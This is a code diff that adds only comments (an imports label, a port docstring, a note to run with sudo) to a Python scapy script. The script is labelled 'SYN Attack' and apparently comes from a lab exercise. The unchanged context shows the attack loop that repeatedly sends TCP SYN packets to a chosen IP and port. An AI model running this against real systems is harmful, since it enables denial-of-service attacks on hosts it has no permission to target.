@@ -3,6 +3,7 @@ Authors : Fridez Lucas, Maxime Welcklen
 Attack : SYN Attack
 """
 
+# Imports
 from scapy.all import *
 from scapy.layers.inet import *
 import argparse
@@ -34,6 +35,7 @@ def main(destination_ip, dport):
 
     Args:
        destination_ip (str): Destination IP
+       dport (int) : Destination port
     """
     ans, unans = srloop(IP(dst=destination_ip)/TCP(dport=dport, flags="S"))
     temp = 0
@@ -43,6 +45,7 @@ def main(destination_ip, dport):
 
 
 # Entry point
+# Run this script in sudo mode !
 if __name__ == "__main__":
     parser = __configure_argparse__()
     args = parser.parse_args()
